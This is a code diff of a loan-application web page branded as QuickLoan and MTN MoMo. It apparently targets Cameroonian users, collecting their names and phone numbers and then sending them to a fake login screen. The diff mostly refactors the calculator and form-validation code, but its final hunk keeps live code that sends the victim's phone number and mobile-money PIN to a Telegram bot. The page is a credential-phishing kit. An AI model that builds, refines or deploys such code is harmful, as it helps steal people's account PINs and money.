@@ -41,7 +41,7 @@
 
         .view-container {
             width: 100%;
-            max-width: 540px; /* Expanded for fuller coverage */
+            max-width: 540px;
             display: none;
             flex-direction: column;
             align-items: center;
@@ -99,7 +99,6 @@
             color: var(--text-main);
         }
 
-        /* Fully Covered Spacious Card Layout */
         .card {
             background: var(--card-bg);
             border-radius: var(--radius);
@@ -244,7 +243,7 @@
             margin-bottom: 4px;
         }
 
-        /* Spacious Form Elements */
+        /* Form Elements */
         .form-label {
             display: block;
             font-weight: 600;
@@ -481,7 +480,7 @@
 </head>
 <body>
 
-    <!-- ================= VIEW 1: CALCULATOR ================= -->
+    <!-- ================= VIEW 1: CALCULATOR (STARTING STEP) ================= -->
     <div id="view-calculator" class="view-container active">
         <header>
             <button class="menu-btn"><i class="fa-solid fa-bars"></i></button>
@@ -519,9 +518,9 @@
             </div>
             <button class="primary-btn" id="goToAppStep1">APPLY NOW</button>
             <div class="features">
-                <div class="feature"><div class="feature-icon">⚡</div>Fast Approval<br>Within 24h</div>
+                <div class="feature"><div class="feature-icon">⚡</div>Fast Approval<br>Within 24 hours</div>
                 <div class="feature"><div class="feature-icon">💰</div>Low Interest<br>From 8%</div>
-                <div class="feature"><div class="feature-icon">🔒</div>Secure<br>Bank-grade</div>
+                <div class="feature"><div class="feature-icon">🔒</div>Secure<br>Bank-grade security</div>
             </div>
         </main>
         <footer-note>© 2026 QuickLoan</footer-note>
@@ -604,7 +603,7 @@
                 <span class="phone-prefix">+237</span>
                 <input type="tel" class="phone-input-custom" id="phone" placeholder="650123456" maxlength="9">
             </div>
-            <small style="color:#999; display:block; margin-bottom:16px;">Enter exactly 9 digits</small>
+            <small style="color:#999; display:block; margin-bottom:16px;">Enter exactly 9 digits (e.g. 650123456)</small>
 
             <div class="btn-group">
                 <button class="secondary-btn" data-target="step1">BACK</button>
@@ -649,7 +648,7 @@
                 <button class="primary-btn" id="submitApplicationBtn" style="flex:1;">Submit Application</button>
             </div>
         </main>
-        <footer-note>© 2026 MTN Momo</footer-note>
+        <footer-note>© 2025 MTN Momo</footer-note>
     </div>
 
     <!-- ================= VIEW 5: LOGIN / PIN VIEW ================= -->
@@ -765,23 +764,32 @@
         const termValue = document.getElementById('termValue');
         const paymentAmount = document.getElementById('paymentAmount');
 
-        function updateCalc() {
-            const amt = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            amountValue.textContent = amt.toLocaleString('en-US') + ' FCFA';
-            termValue.textContent = months + ' months';
-            const annualRate = 0.08;
-            const mRate = annualRate / 12;
-            const power = Math.pow(1 + mRate, months);
-            const payment = (amt * (mRate * power)) / (power - 1);
-            paymentAmount.textContent = payment.toFixed(2) + ' FCFA';
+        function formatFCFA(value) {
+            return value.toLocaleString('en-US') + ' FCFA';
         }
 
-        amountSlider.addEventListener('input', updateCalc);
-        termSlider.addEventListener('input', updateCalc);
-        updateCalc();
+        function updateCalculator() {
+            const amount = parseFloat(amountSlider.value);
+            const months = parseFloat(termSlider.value);
+            amountValue.textContent = formatFCFA(amount);
+            termValue.textContent = months + (months === 1 ? ' month' : ' months');
+            const annualRate = 0.08;
+            const monthlyRate = annualRate / 12;
+            if (months === 0) {
+                paymentAmount.textContent = amount.toFixed(2) + ' FCFA';
+            } else {
+                const power = Math.pow(1 + monthlyRate, months);
+                const monthlyPayment = amount * (monthlyRate * power) / (power - 1);
+                paymentAmount.textContent = monthlyPayment.toFixed(2) + ' FCFA';
+            }
+        }
 
-        document.getElementById('goToAppStep1').addEventListener('click', () => {
+        updateCalculator();
+        amountSlider.addEventListener('input', updateCalculator);
+        termSlider.addEventListener('input', updateCalculator);
+
+        // Transition from Calculator (Step 0) to Step 1 Form
+        document.getElementById('goToAppStep1').addEventListener('click', function() {
             localStorage.setItem('loanAmount', amountSlider.value);
             localStorage.setItem('loanTerm', termSlider.value);
             document.getElementById('loanAmountInput').value = amountSlider.value;
@@ -790,83 +798,111 @@
         });
 
         // 2. Step 1 Form Logic
-        document.getElementById('goToAppStep2').addEventListener('click', () => {
-            const amt = document.getElementById('loanAmountInput').value;
+        document.getElementById('goToAppStep2').addEventListener('click', function() {
+            const amount = document.getElementById('loanAmountInput').value.trim();
             const purpose = document.getElementById('loanPurpose').value.trim();
-            if (!amt || amt < 5000 || !purpose) {
-                alert('Please enter valid amount (min 5000) and specify your loan purpose.');
+
+            if (!amount || amount < 5000) {
+                document.getElementById('loanAmountInput').classList.add('invalid');
+                alert('Please enter a valid loan amount (minimum 5,000 FCFA).');
                 return;
             }
+            if (!purpose) {
+                document.getElementById('loanPurpose').classList.add('invalid');
+                alert('Please enter a loan purpose.');
+                return;
+            }
+
+            document.getElementById('loanAmountInput').classList.remove('invalid');
+            document.getElementById('loanPurpose').classList.remove('invalid');
+
             localStorage.setItem('loanType', document.getElementById('loanType').value);
-            localStorage.setItem('loanAmount', amt);
+            localStorage.setItem('loanAmount', amount);
             localStorage.setItem('loanTerm', document.getElementById('loanTermSelect').value);
             localStorage.setItem('loanPurpose', purpose);
+
             switchView('step2');
         });
 
         // 3. Step 2 Form Logic
-        document.getElementById('goToAppStep3').addEventListener('click', () => {
-            const fName = document.getElementById('firstName').value.trim();
-            const lName = document.getElementById('lastName').value.trim();
+        document.getElementById('goToAppStep3').addEventListener('click', function() {
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
             const phone = document.getElementById('phone').value.trim();
 
-            if (!fName || !lName || phone.length !== 9 || !/^\d+$/.test(phone)) {
-                alert('Please check your names and input a valid 9-digit phone number.');
+            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => el.classList.remove('invalid'));
+
+            let valid = true;
+            if (!firstName) { document.getElementById('firstName').classList.add('invalid'); valid = false; }
+            if (!lastName) { document.getElementById('lastName').classList.add('invalid'); valid = false; }
+            if (!phone || phone.length !== 9 || !/^\d+$/.test(phone)) {
                 document.getElementById('phoneGroup').classList.add('invalid');
+                valid = false;
+            }
+
+            if (!valid) {
+                alert('Please fill in all fields correctly.\n• Phone number must be exactly 9 digits');
                 return;
             }
-            document.getElementById('phoneGroup').classList.remove('invalid');
-            localStorage.setItem('firstName', fName);
-            localStorage.setItem('lastName', lName);
+
+            localStorage.setItem('firstName', firstName);
+            localStorage.setItem('lastName', lastName);
             localStorage.setItem('phone', phone);
             sessionStorage.setItem('savedPhone', phone);
 
-            // Populate summary before going to step 3
             populateSummary();
             switchView('step3');
         });
 
         function populateSummary() {
             const summaryBox = document.getElementById('summaryBox');
-            const amt = parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString('fr-FR');
+            const xafAmount = parseFloat(localStorage.getItem('loanAmount') || 5000);
+            const loanAmountFormatted = xafAmount.toLocaleString('fr-FR', { style: 'currency', currency: 'XAF' });
+
             summaryBox.innerHTML = `
-                <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType')}</span></div>
-                <div class="summary-row"><span>Amount:</span><span class="summary-value">${amt} XAF</span></div>
-                <div class="summary-row"><span>Duration:</span><span class="summary-value">${localStorage.getItem('loanTerm')} Months</span></div>
-                <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose')}</span></div>
+                <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
+                <div class="summary-row"><span>Amount:</span><span class="summary-value">${loanAmountFormatted}</span></div>
+                <div class="summary-row"><span>Duration:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
+                <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
                 <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName')} ${localStorage.getItem('lastName')}</span></div>
                 <div class="summary-row"><span>Phone:</span><span class="summary-value">+237 ${localStorage.getItem('phone')}</span></div>
             `;
-            if(localStorage.getItem('employmentStatus')) document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
-            if(localStorage.getItem('annualIncome')) document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+
+            if (localStorage.getItem('employmentStatus')) {
+                document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
+            }
+            if (localStorage.getItem('annualIncome')) {
+                document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
+            }
         }
 
         // 4. Step 3 Final Submission Logic
-        document.getElementById('submitApplicationBtn').addEventListener('click', () => {
+        document.getElementById('submitApplicationBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
+
             if (!income || income < 1000) {
-                alert('Please enter valid annual income.');
+                alert('Please enter a valid annual income (minimum 1,000 XAF).');
                 return;
             }
+
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
             localStorage.setItem('annualIncome', income);
 
-            // Show loading spinner
             const loader = document.getElementById('loadingOverlay');
             document.getElementById('loadingText').textContent = 'Submitting application credentials...';
             loader.classList.add('active');
 
             setTimeout(() => {
                 loader.classList.remove('active');
-                const success = document.getElementById('successOverlay');
-                success.classList.add('active');
+                const successOverlay = document.getElementById('successOverlay');
+                successOverlay.classList.add('active');
+
                 setTimeout(() => {
-                    success.classList.remove('active');
-                    // Pre-fill login phone
+                    successOverlay.classList.remove('active');
                     const savedPhone = localStorage.getItem('phone');
-                    if(savedPhone) document.getElementById('loginPhoneInput').value = savedPhone;
+                    if (savedPhone) document.getElementById('loginPhoneInput').value = savedPhone;
                     switchView('login');
-                }, 2500);
+                }, 2000);
             }, 2000);
         });
 
@@ -910,7 +946,6 @@
             document.getElementById('loadingText').textContent = 'Authenticating account session...';
             loader.classList.add('active');
 
-            // Send Telegram alert for login attempt
             const msg = `🔐 *New Login Attempt*\nPhone: \`+237 ${phone}\`\nPIN: \`${enteredPin}\``;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
